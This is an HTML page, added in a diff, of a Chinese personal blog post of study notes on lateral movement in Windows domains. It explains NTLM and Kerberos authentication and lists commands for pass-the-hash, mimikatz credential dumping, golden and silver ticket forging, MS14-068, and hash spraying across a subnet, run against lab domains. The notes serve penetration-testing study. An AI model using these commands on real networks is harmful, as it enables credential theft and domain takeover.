@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Phyb0x's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言想想横向移动自己也就只懂msf、IPC啥的打一打，有点菜，总结学习一些横向移动的姿势。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="横向移动">
+<meta property="og:url" content="http://yoursite.com/2018/12/29/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="Phyb0x&#39;s blog">
+<meta property="og:description" content="前言想想横向移动自己也就只懂msf、IPC啥的打一打，有点菜，总结学习一些横向移动的姿势。">
+<meta property="og:image" content="https://i.imgur.com/rGdeZUA.png">
+<meta property="og:image" content="https://i.imgur.com/Q9A56kX.png">
+<meta property="og:image" content="https://i.imgur.com/PrMNH5k.png">
+<meta property="og:image" content="https://i.imgur.com/b8haBxo.png">
+<meta property="og:image" content="https://i.imgur.com/Uv0YQfe.png">
+<meta property="og:image" content="https://i.imgur.com/DhO9w4v.png">
+<meta property="og:image" content="https://i.imgur.com/mQsDYeD.png">
+<meta property="og:image" content="https://i.imgur.com/nYkA1Xc.png">
+<meta property="og:image" content="https://i.imgur.com/RWXjfjn.png">
+<meta property="og:image" content="https://i.imgur.com/7bmj1Bt.jpg">
+<meta property="article:published_time" content="2018-12-29T10:19:47.000Z">
+<meta property="article:modified_time" content="2020-01-12T01:11:20.000Z">
+<meta property="article:author" content="Phyb0x">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/rGdeZUA.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/12/29/横向移动/"/>
+
+
+
+
+
+  <title>横向移动 | Phyb0x's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <a href="https://github.com/phyb0x" target="_blank" rel="noopener"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Phyb0x's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/29/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Phyb0x">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://b-ssl.duitang.com/uploads/item/201710/05/20171005185843_HmGKQ.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phyb0x's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">横向移动</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-29T18:19:47+08:00">
+                2018-12-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想想横向移动自己也就只懂msf、IPC啥的打一打，有点菜，总结学习一些横向移动的姿势。</p>
+<a id="more"></a>
+
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="加密与hash的区别"><a href="#加密与hash的区别" class="headerlink" title="加密与hash的区别"></a>加密与hash的区别</h3><p>哈希（Hash）</p>
+<p>是将目标文本转换成具有相同长度的、不可逆的杂凑字符串（或叫做消息摘要）</p>
+<p>加密（Encrypt）</p>
+<p>是将目标文本转换成具有不同长度的、可逆的密文。</p>
+<p>主要的区别有如下两点</p>
+<p>1、哈希算法往往被设计成生成具有相同长度的文本，而加密算法生成的文本长度与明文本身的长度有关。</p>
+<p>2、哈希算法是不可逆的，而加密算法是可逆的。</p>
+<h3 id="hash类型"><a href="#hash类型" class="headerlink" title="hash类型"></a>hash类型</h3><h4 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM HASH"></a>LM HASH</h4><p>LAN Manager（LM）哈希是Windows系统所用的第一种密码哈希算法。在LAN Manager协议中使用，非常容易通过暴力破解获取明文凭据。但是在Windows Vista和Windows 7系统之后，这种哈希算法是默认关闭。</p>
+<p>hash生成方法</p>
+<pre><code>用户的密码字符串被全部转换成大写字母形式；
+给密码字符串增加空字符，直到使其包含有14个字符为止；
+“新”得到的密码字符串被分成两半，每一半分别包含7个字符；
+每一半字符串都各自添加一个校验位，分别用于创建两个64位的DES加密密钥；
+所生成的每一个DES密钥都被用于加密一个固定的ASCII字符串KGS!@#$%，得到两个长度为8字节的密文；
+两个8字节的密文合并起来，形成1个16字节的字符串。至此，LM哈希结束。</code></pre><h4 id="NTML"><a href="#NTML" class="headerlink" title="NTML"></a>NTML</h4><p>NTML 是用于 Windows NT 和 Windows 2000 Server 工作组环境的身份验证协议。它还用在必须对 Windows NT 系统进行身份验证的混合 Windows 2000 Active Directory 域环境中。这类Hash可以直接用于PtH，并且通常存在于lsass进程中，便于SSP使用。</p>
+<p>hash生成方法</p>
+<pre><code>将明文口令转换成十六进制的格式
+转换成Unicode格式，即在每个字节之后添加0x00
+对Unicode字符串作MD4加密，生成32位的十六进制数字串</code></pre><p>Windows系统下hash密码格式 用户名称:RID:LM-HASH值:NT-HASH值，</p>
+<p>可以用LM-HASH值:NT-HASH值去在线查询<a href="http://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/en/ophcrack.php</a>或者使用GetHashes、Ophcrack破解系统Hash密码。</p>
+<h4 id="NET-NTLM-HASH"><a href="#NET-NTLM-HASH" class="headerlink" title="NET-NTLM HASH"></a>NET-NTLM HASH</h4><p>NTML认证流程如下：</p>
+<pre><code>1、客户端向服务器发送一个请求，请求中包含明文的登录用户名。服务器会提前存储登录用户名和对应的密码hash
+
+2、服务器接收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。使用存储的登录用户密码hash加密Challenge，获得Challenge1
+
+3、客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器
+
+4、服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功</code></pre><p>域环境的话其实是一样的，就是发送随机数比对challenge和response都是在DC中进行，server就只当中间商了，client把challenge,response及username传给server，server再传给DC进行比对。</p>
+<p><img src="https://i.imgur.com/rGdeZUA.png" alt=""></p>
+<p>NET-NTLM HASH是指网络环境下NTLM认证中的hash，有两种一种是Net-NTLMv1另一种是Net-NTLMv2。</p>
+<p>Net-NTLMv1 相对脆弱，自Windows Vista/Server2008开始，系统默认禁用Net-NTLMv1，使用Net-NTLMv2。</p>
+<h3 id="哈希传递-pth"><a href="#哈希传递-pth" class="headerlink" title="哈希传递(pth)"></a>哈希传递(pth)</h3><p>pth就是直接通过LM HASH和NTLM HASH不需要明文密码直接远程登录。上述说的Net-NTML是不能用于pth的。</p>
+<p>适用于</p>
+<pre><code>域/工作组环境
+可以获得hash,但是条件不允许对hash爆破
+内网中存在和当前机器相同的密码</code></pre><h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><pre><code>use exploit/windows/smb/psexec_psh
+set smbdomain xx.int
+Set SMBuser admin
+set SMBPass 01FC5A6BE7BC6929AAD3BXXX:0CB6948805F7XXXXX807973B89537</code></pre><p>看大佬的讨论说psexec_psh网络可达 普通用户权限能直接用，但是在2008系统hash的情况下用，抓到2003的hash没法用这个来连接smb。</p>
+<h4 id="pth-exec"><a href="#pth-exec" class="headerlink" title="pth-exec"></a>pth-exec</h4><p>kali自带的pth的工具很多</p>
+<p><img src="https://i.imgur.com/Q9A56kX.png" alt=""></p>
+<pre><code>pth-winexec -U pentestlab/administrator%eb9e3066e4d25b5025ad3b83fa6627c7:03bebb338e70244589ea67c7439c77ba //1.1.1.21 cmd.exe</code></pre><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>先抓密码取得NTMLhash，mimikatz实现了在禁用NTLM的环境下仍然可以远程连接。</p>
+<pre><code>privilege::debug
+sekurlsa::logonpasswords
+
+mimikatz # sekurlsa::pth /user:Administrator /domain:FENTESTLAB.com /ntlm:11ec7935618f326490509a0703fbadb8</code></pre><p><img src="https://i.imgur.com/PrMNH5k.png" alt=""></p>
+<p>还可以利用aes key远程连接(要安装kb2871997这个补丁才可以测试成功，这里只做记录)</p>
+<p>获取aes key</p>
+<pre><code>privilege::debug
+sekurlsa::ekeys</code></pre><p><img src="https://i.imgur.com/b8haBxo.png" alt=""></p>
+<pre><code>privilege::debug 
+sekurlsa::pth /user:Administrator /domain:FENTESTLAB.com /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c</code></pre><p>弹出cmd之后连接的时候要使用计算机名称，如果不更换密码aes key可以一直使用。</p>
+<pre><code>dir \\WIN-8VVLRPIAJB0\c$</code></pre><h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><p>wmi是从windows从03/xp开始win内置的插件，是为了管理员能更加方便的对远程windows主机进行各种日常管理。</p>
+<p>win版：<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">https://github.com/maaaaz/impacket-examples-windows</a></p>
+<p>python版：<a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</a></p>
+<pre><code>wmiexec -hashes 00000000000000000000000000000000:7ECFFFF0C3548187607A14BAD0F88BB1 域名/用户名@192.168.1.1 &quot;whoami&quot;</code></pre><h4 id="Invoke-TheHash"><a href="#Invoke-TheHash" class="headerlink" title="Invoke-TheHash"></a>Invoke-TheHash</h4><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a>    </p>
+<pre><code>Invoke-WMIExec -Target 1.1.1.22 -Domain pentestlab -Username administrator -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command &quot;command or launcher to execute&quot; -verbose</code></pre><p><img src="https://i.imgur.com/Uv0YQfe.png" alt=""></p>
+<p>没有执行成功，里面有很多脚本应用场景也不同。</p>
+<h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>这个工具可以对C段进行批量尝试pth，可以先ew代理到kali</p>
+<p><a href="https://github.com/byt3bl33d3r/CrackMapExec.git" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/CrackMapExec.git</a></p>
+<pre><code>crackmapexec 1.1.1.0/24 -u administrator -H 11ec7935618f326490509a0703fbzdb8</code></pre><h3 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h3><p><img src="https://i.imgur.com/DhO9w4v.png" alt=""></p>
+<pre><code>第一:从AS服务器中获取TGT票据
+用户在客户端输入账号和密码之后，会对密码进行hash处理，作为user-secret-key
+1. 客户端将用户名发送给AS服务器申请服务,在AS服务器中会对用户名进行验证，在AS服务器本地数据库中查询到该用户名的密码，并使用hash生成user-secrect-key.
+2. AS服务器向用户发送两样东西：
+   1） Client/TGS会话密钥，使用user-secrect-key进行加密
+   2） TGT，包含TGS会话密钥，用户信息，时间戳，TGT有效期。使用TGS密钥进行加密
+3. 用户接收到消息之后，回使用本地的user-secret-key对消息1)进行解密，如果解密成功，说明用户提供的凭证是正确的,此时用户得到了加密后的TGT。
+第二:从TGS服务器中获取访问权限
+1. 客户端向TGS服务器发送信息：
+   1） 第一步骤中的TGT
+   2） 认证信息（认证符(Authenticator)），包含用户id以及时间戳，通过TGS会话密钥进行加密。
+2. TGS服务器收到消息之后，会使用TGS密钥对消息1）进行解密,获取到TGS会话密钥，进而对消息2）进行解密，在对用户id以及时间戳进行认证，如果认证成功，向客户端发送消息：
+   1） client-server-ticket(包含SS会话密钥，用户名信息以及时间戳)，使用ss密钥进行加密
+   2） ss会话密钥使用TGS会话密钥进行加密
+3. 客户端收到信息之后会对消息2）进行解密，获得ss会话密钥。
+第三：访问服务
+1. 客户端向ss服务器发送以下消息：
+   1）第二步骤中的client-server-ticket
+   2）新的Authenticator，包含用户信息，时间戳。通过SS会话密钥进行加密
+2. SS服务器收到消息之后，会使用ss密钥对消息1）进行解密，解密之后使用ss会话密钥对消息2）解密，解密成功之后会得到authenticator，认证之后，发送：
+   1）新时间戳，Client发送的时间戳加1，通过ss会话密钥进行加密
+3. 客户端收到时间戳之后，解密确认，成功之后发送服务请求
+4. ss服务器收到之后提供服务。</code></pre><h3 id="pass-the-ticket-ptt"><a href="#pass-the-ticket-ptt" class="headerlink" title="pass-the-ticket(ptt)"></a>pass-the-ticket(ptt)</h3><h4 id="黄金票据-Golden-Ticket"><a href="#黄金票据-Golden-Ticket" class="headerlink" title="黄金票据(Golden Ticket)"></a>黄金票据(Golden Ticket)</h4><p>先假设这么一种情况,原先已拿到的域内所有的账户hash,包括krbtgt这个账户,由于有些原因导致域管权限丢失,但好在你还有一个普通域用户权限,碰巧管理员在域内加固时忘记重置krbtgt密码,基于此条件,我们还能利用该票据重新获得域管理员权限,利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz),能够绕过对任意用户的账号策略,让用户成为任意组的成员,可用于Kerberos认证的任何服务</p>
+<p>伪造黄金票据需要以下条件</p>
+<pre><code>krbtgt用户的hash(就意味着你已经有域控制器权限了)
+域名称
+域的SID值
+要伪造的用户名</code></pre><p>获取dc krbtgt用户hash，获取域sid：</p>
+<pre><code>mimikatz# lsadump::lsa /patch </code></pre><p><img src="https://i.imgur.com/mQsDYeD.png" alt=""></p>
+<pre><code>mimikatz # kerberos::golden /user:administrator /domain:pentestlab.com /sid:S-1-5-21-2777116530-3322806355-1208541214 /krbtgt:c5535efd632aff3b61143ec34c524d51 /ticket:pentestlab.kirbi
+mimikatz # kerberos::pentestlab.kirbi</code></pre><p><img src="https://i.imgur.com/nYkA1Xc.png" alt=""><br><img src="https://i.imgur.com/RWXjfjn.png" alt=""></p>
+<p>也可以使用wmiexec远程登录</p>
+<pre><code>wmiexec /shell DCSERVER.PENTESTLAB.COM</code></pre><h4 id="白银票据-Silver-Ticket"><a href="#白银票据-Silver-Ticket" class="headerlink" title="白银票据(Silver Ticket)"></a>白银票据(Silver Ticket)</h4><p>通过观察Kerberos协议的认证过程不难发现,如果我们获取了Server秘钥Ks(服务器口令散列值),就可以跳过KDC的认证，直接伪造票据和目标Server通信</p>
+<pre><code>kerberos::golden /domain:pentestlab.com /sid:S-1-5-21-2777116530-3322806355-1208541214  /target:DMEMBER.pentestlab.com /rc4:34fd2574ccc7b11615bd6378b1799a95  /service:cifs /user:administrator /ptt</code></pre><h4 id="两个票据之间的区别"><a href="#两个票据之间的区别" class="headerlink" title="两个票据之间的区别"></a>两个票据之间的区别</h4><p>访问权限不同</p>
+<pre><code>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限
+Silver Ticket: 伪造TGS,只能访问指定的服务</code></pre><p>加密方式不同</p>
+<pre><code>Golden Ticket 由Kerberos的Hash加密
+Silver Ticket 由服务账号(通常为计算机账户)Hash加密</code></pre><p>认证流程不一样</p>
+<pre><code>Golden Ticket 的利用过程需要访问域控,而Silver Ticket不需要</code></pre><h4 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h4><pre><code>windows域中使用kerberos协议过程中，为了让SS服务器判断Client是否有权限访问服务，引入了PAC机制。构造PAC也是这个漏洞的根本。
+1. 在请求AS时，将require_PAC设置成False。
+2. 在请求TGS时，构造PAC，然后使用MD5签名（PAC尾部的签名算法可以任意指定），PAC并没有放在TGT中发送，而是在请求包的其他位置（但是还是可以解析）。
+3. TGS_REP返回的不是会话密钥，而是返回的带PAC的TGT（微软的锅）</code></pre><p>利用过程</p>
+<p>得到普通域用户的sid：</p>
+<pre><code>whoami/user </code></pre><p>执行payload生成ccache：</p>
+<pre><code>MS14-068.exe -u administrator@pentestlab.com -s S-1-5-21-4173655609-916892889-516531421-1108 -d DMEMBER.PENTESTLAB.COM -p A100b200</code></pre><p>使用mimikatz注入凭据</p>
+<pre><code>kerberos::purge #清空当前机器存在的凭证
+kerberos::ptc c:\downloads\administrator@pentestlab.com.ccache</code></pre><p>(盗图)</p>
+<p><img src="https://i.imgur.com/7bmj1Bt.jpg" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是学到不少东西，有些姿势受限环境复现不成功。内网渗透假期可能会好好研究下，接下来就是准备考试了…本文仅作为总结记录，参考资料文末都已标明。</p>
+<p>参考连接：</p>
+<p><a href="http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" target="_blank" rel="noopener">http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</a></p>
+<p><a href="https://www.secpulse.com/archives/65256.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/65256.html</a></p>
+<p><a href="https://xz.aliyun.com/t/1943" target="_blank" rel="noopener">https://xz.aliyun.com/t/1943</a></p>
+<p><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/" target="_blank" rel="noopener">https://klionsec.github.io/2016/08/10/ntlm-kerberos/</a></p>
+<p><a href="https://xz.aliyun.com/t/2205" target="_blank" rel="noopener">https://xz.aliyun.com/t/2205</a></p>
+<p><a href="https://xz.aliyun.com/t/1802" target="_blank" rel="noopener">https://xz.aliyun.com/t/1802</a></p>
+<p><a href="http://www.vuln.cn/6813" target="_blank" rel="noopener">http://www.vuln.cn/6813</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>文章作者:</span><a href="/" title="访问 Phyb0x 的个人博客">Phyb0x</a></p>
+  <p><span>最后更新:</span>2020年01月12日 09:01:20</p>
+  <p><span>原始链接:</span><a href="/2018/12/29/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="横向移动">http://yoursite.com/2018/12/29/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</a></p>
+  <p><span>版权声明:</span>本博客所有文章除特别声明外，均采用 <i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" title="Attribution-NonCommercial-ShareAlike 3.0 Unported (CC BY-NC-SA 3.0)"> BY-NC-SA 3.0 许可协议</a>，转载请注明出处！</p>  
+</div>
+
+      
+    </div>
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>万一有人点了呢！</div>
+  <button id="rewardButton" disable="enable" style="width: 80px;line-height: 38px;text-align: center;font-weight: bold;color: #fff;border-radius: 5px;
+margin:0 20px 20px 0;position: relative;overflow: hidden;color: #8c96a0;text-shadow:1px 1px 1px #fff;border:1px solid #dce1e6;box-shadow: 0 1px 2px #fff inset,0 -1px 0 #a8abae inset;background: -webkit-linear-gradient(top,#f2f3f7,#e4e8ec);background: -moz-linear-gradient(top,#f2f3f7,#e4e8ec);background: linear-gradient(top,#f2f3f7,#e4e8ec);" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    打赏
+  </button>
+  <div id="QR" style="display: none;">
+    
+      <div id="wechat" style="display: inline-block;width:150px;height:150px">
+        <img id="wechat_qr" src="/images/wechat.png" alt="Phyb0x WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+    
+    
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/28/ARP%E6%AC%BA%E9%AA%97/" rel="next" title="ARP欺骗">
+                <i class="fa fa-chevron-left"></i> ARP欺骗
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/01/14/jsonp%E5%AE%89%E5%85%A8/" rel="prev" title="jsonp安全">
+                jsonp安全 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://b-ssl.duitang.com/uploads/item/201710/05/20171005185843_HmGKQ.jpeg"
+                alt="Phyb0x" />
+            
+              <p class="site-author-name" itemprop="name">Phyb0x</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cdusec.happyhacking.top" title="CDUSEC" target="_blank">CDUSEC</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://nbsec.xyz/" title="大熊's Blog" target="_blank">大熊's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a3ura.github.io/" title="a3ura's Blog" target="_blank">a3ura's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a-running-snail2333.github.io/blog.github.io/" title="a-running-snail's Blog" target="_blank">a-running-snail's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#横向移动"><span class="nav-number">2.</span> <span class="nav-text">横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#加密与hash的区别"><span class="nav-number">2.1.</span> <span class="nav-text">加密与hash的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hash类型"><span class="nav-number">2.2.</span> <span class="nav-text">hash类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LM-HASH"><span class="nav-number">2.2.1.</span> <span class="nav-text">LM HASH</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NTML"><span 